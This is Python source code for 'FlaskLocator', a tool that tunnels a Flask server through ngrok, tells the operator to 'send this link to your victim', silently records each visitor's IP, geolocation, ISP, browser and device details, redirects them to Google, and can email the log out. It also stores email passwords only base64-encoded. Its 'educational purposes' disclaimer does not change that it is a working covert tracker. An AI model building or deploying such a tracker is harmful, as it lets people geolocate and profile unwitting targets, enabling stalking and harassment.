import sys
import os
import logging
import requests
import json
import email
import smtplib
import ssl
import base64

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pyngrok import ngrok
from flask import Flask
from flask import request as r
from flask import render_template
from flask import jsonify


log_file = "log.txt"
cache_file = "data.cache"
port_ = 80
temp_ip_address_ = []
uniqe_ips = []
region = "us" #You can change ngrok region here
ngrok_link = ngrok.connect(80, "http", region=region)
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True

if sys.platform.lower() == "win32":
    os.system('color')

class style():
    BLACK = lambda x: '\033[30m' + str(x)
    RED = lambda x: '\033[31m' + str(x)
    GREEN = lambda x: '\033[32m' + str(x)
    YELLOW = lambda x: '\033[33m' + str(x)
    BLUE = lambda x: '\033[34m' + str(x)
    CYAN = lambda x: '\033[36m' + str(x)
    WHITE = lambda x: '\033[37m' + str(x)
    UNDERLINE = lambda x: '\033[4m' + str(x)
    RESET = lambda x: '\033[0m' + str(x)

def clear():
    print (u"{}[2J{}[;H".format(chr(27), chr(27)))


def sendMail(sender_email, receiver_email, password):
    subject = "FlaskLocator Log File"
    body = "Thank you for using FlaskLocator here is your latest log file:"
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message['Bcc'] = receiver_email

    message.attach(MIMEText(body, "plain"))

    with open(log_file, 'rb') as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename = {log_file}")
    message.attach(part)
    text = message.as_string()
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)


def storeData(sender_email, receiver_email, password):
    password_bytes  = password.encode('ascii')
    base64_bytes    = base64.b64encode(password_bytes)
    base64_password = base64_bytes.decode('ascii')
    data = {
        "credentials":{
            "sender_email": sender_email,
            "password": base64_password,
            'receiver_email': receiver_email
        }
    }
    with open(cache_file, 'w') as write_file:
        json.dump(data, write_file)





def banner():
    print(style.RESET('''

  ______ _           _    _                     _
 |  ____| |         | |  | |                   | |
 | |__  | | __ _ ___| | _| |     ___   ___ __ _| |_ ___  _ __
 |  __| | |/ _` / __| |/ / |    / _ \ / __/ _` | __/ _ \| '__|
 | |    | | (_| \__ \   <| |___| (_) | (_| (_| | || (_) | |
 |_|    |_|\__,_|___/_|\_\______\___/ \___\__,_|\__\___/|_|
''' + style.BLUE('''
        ::: Coded by  : @pr0xy07
        ::: Contact me: pr0xy07@tutanota.com
''')))



    print(style.YELLOW(
    '''
       [+]Python Flask Geolocator, Ip Tracker, Device Info by URL (Ngrok Hosting).

       [+]For more info you can contact me at pr0xy07@tutanota.com'''))
    print(style.RED(
    '''
       [+]LEGAL DISCLAIMER!
        Usage of Locator for attacking targets without prior mutual consent
        is illegal. It's the end user's responsibility to obey all applicable
        local, state and federal laws. Developers assume no liability and are
        not responsible for any misuse or damage caused by this program''' + style.RESET("")))



def endingBanner():
    clear()
    banner()
    ngrok.kill()
    print(style.GREEN("\n[+]") + style.RESET("Thank you for using FlaskLocator."))
    print(style.GREEN("[+]") + style.RESET("Contact me: pr0xy07@tutanota.com"))

def getRedirect():
    if redirect == "":
        getRedirect.redirect = "www.google.com"
    else:
        getRedirect.redirect = redirect


def getJsonData():
      with open(cache_file, 'r') as read_file:
            data = read_file.read()
            obj = json.loads(data)

            getJsonData.sender_mail = str(obj['credentials']['sender_email'])
            getJsonData.receiver_mail = str(obj['credentials']['receiver_email'])
            getJsonData.password = str(obj['credentials']['password'])

            base64_bytes    = getJsonData.password.encode('ascii')
            password_bytes  = base64.b64decode(base64_bytes)
            getJsonData.password = password_bytes.decode('ascii')




@app.route('/')
def index():
    getRedirect()
    return render_template('main.html', value = getRedirect.redirect)

@app.route('/', methods=['POST'])
def get_ip():
    data = r.get_json()
    ip_ = data['ip']

    if ip_ not in uniqe_ips:
        uniqe_ips.append(ip_)
        req = requests.get('https://ipinfo.io/{}/json'.format(ip_))
        resp_json = json.loads(req.text)
        print(str(style.GREEN("\n[+]") + style.RESET("New IP found:")))
        print("Device IP: {}".format(ip_))
        print("Device Country: {}".format(resp_json['country'].title()))
        print("Device Region: {}".format(resp_json['region'].title()))
        print("Device City Location: {}".format(resp_json['city'].title()))
        print("Device Platform: {}".format(r.user_agent.platform.title()))
        print("Device Browser: {}".format(r.user_agent.browser.title()))
        print("Browser Version: {}".format(r.user_agent.version.title()))
        print("Device Location: {}".format(resp_json['loc']))
        print("Device Timezone: {}".format(resp_json['timezone']))
        print("Service Provider: {}".format(resp_json['org']))
        print("User Agent: {}".format(r.headers.get('User-Agent')))
        f = open(log_file, 'w')
        f = open(log_file, 'a')
        f.write("\nDevice IP: {}\n".format(ip_))
        f.write("Device Country: {}\n".format(resp_json['country'].title()))
        f.write("Device Region: {}\n".format(resp_json['region'].title()))
        f.write("Device City Location: {}\n".format(resp_json['city'].title()))
        f.write("Device Platform: {}\n".format(r.user_agent.platform.title()))
        f.write("Device Browser: {}\n".format(r.user_agent.browser.title()))
        f.write("Browser Version: {}".format(r.user_agent.version.title()))
        f.write("Device Location: {}\n".format(resp_json['loc']))
        f.write("Service Provider: {}\n".format(resp_json['org']))
        f.write("User Agent: {}\n".format(r.headers.get('User-Agent')))
        f.write("-" * 50)
        print(style.GREEN("[+]") + style.RESET("Saved log in {}").format(log_file))

    else:
        print(style.GREEN("[+] {} connected again.".format(ip_)))

    return jsonify(status="success", data=data)

def flask_server():
    if __name__ == '__main__':
        app.run(host = '0.0.0.0', port=port_)

mail_loop  = True
mail_loop_ = True
while True:
    clear()
    banner()
    edu_check_ = input(style.GREEN("\n[+]") + style.RESET("Do you agree on using this program for educational purposes only [y/n]: "))
    if edu_check_ == "y" or edu_check_ == "Y":
        clear()
        banner()
        redirect =input(style.GREEN("\n[+]") + style.RESET("Enter redirect website, leave empty for default (www.google.com): "))
        getRedirect()
        if os.path.isfile(log_file):
            os.remove(log_file)
        print(style.YELLOW("\n[-]") + style.RESET("Starting Ngrok server..."))
        print(style.YELLOW("[+]") + style.RESET("Starting Flask Server... "))
        print(style.GREEN("\n[+]") + style.RESET("Send this link to your victim: {}\n").format(ngrok_link))
        print(style.GREEN("\n[+]") + style.RED("Press CTRL + C to go back to home screen.") + style.RESET(""))
        flask_server()


        while mail_loop:
            mailopt_ =  input(style.GREEN("\n[+]") + style.RESET("Do you want to send the information found to your email [y/n]: "))

            if mailopt_ == "y" or mailopt_ == "Y":
                clear()
                banner()
                if os.path.isfile(cache_file):
                    get_creds_json = input(style.GREEN("\n[+]") + style.RESET("Do you want to get credentials saved in {} [y/n]: ").format(cache_file))
                    if get_creds_json == 'y' or get_creds_json == 'Y':
                        getJsonData()

                        print(style.GREEN("\n[+]") + style.RESET("Using the following Credentials:"))
                        print(style.GREEN(" [-]") + style.RESET("Sender Email: {}").format(getJsonData.sender_mail))
                        print(style.GREEN(" [-]") + style.RESET("Sender Email Password: {}").format(getJsonData.password))
                        print(style.GREEN(" [-]") + style.RESET("Receiver Email {}").format(getJsonData.receiver_mail))
                        print(style.GREEN("[+]") + style.RESET("\nSending email to {}").format(getJsonData.receiver_mail))
                        sendMail(getJsonData.sender_mail, getJsonData.receiver_mail, getJsonData.password)
                        print(style.GREEN("[+]") + style.RESET("Email sent to {}").format(getJsonData.receiver_mail))
                        break

                    elif get_creds_json == 'n' or get_creds_json == 'N':
                        sender_mail = input(style.GREEN("\n[+]") + style.RESET("Enter sender email: "))
                        receiver_mail = input(style.GREEN("[+]") + style.RESET("Enter receiver email: "))
                        password = input(style.GREEN("[+]") + style.RESET("Enter password sender email: "))
                        save_data = input(style.GREEN("\n[+]") + style.RESET("Do you want to save your credentials to log in automatically the next time [y/n]: "))
                        if save_data == "y" or save_data == "Y":
                            storeData(sender_mail, receiver_mail, password)
                        print(style.GREEN("[+]") + style.RESET("Sending email to {}").format(receiver_mail))
                        sendMail(sender_mail, receiver_mail, password)
                        print(style.GREEN("[+]") + style.RESET("Email sent to {}").format(receiver_mail))
                        break

                    else:
                        continue
                else:
                    sender_mail = input(style.GREEN("\n[+]") + style.RESET("Enter sender email: "))
                    receiver_mail = input(style.GREEN("[+]") + style.RESET("Enter receiver email: "))
                    password = input(style.GREEN("[+]") + style.RESET("Enter password sender email: "))
                    save_data = input(style.GREEN("\n[+]") + style.RESET("Do you want to save your credentials to log in automatically the next time [y/n]: "))
                    if save_data == "y" or save_data == "Y":
                        storeData(sender_mail, receiver_mail, password)
                    print(style.GREEN("[+]") + style.RESET("Sending email to {}").format(receiver_mail))
                    sendMail(sender_mail, receiver_mail, password)
                    print(style.GREEN("[+]") + style.RESET("Email sent to {}").format(receiver_mail))
                    break


            elif mailopt_ == 'n' or mailopt_ == 'N':
                mail_loop = False


        endingBanner()
        break

    elif edu_check_ == "n" or edu_check_ == "N":
        print(style.GREEN("[+]") + style.RED("You should only use this program for educational purposes only!"))
        break
    else:
        continue
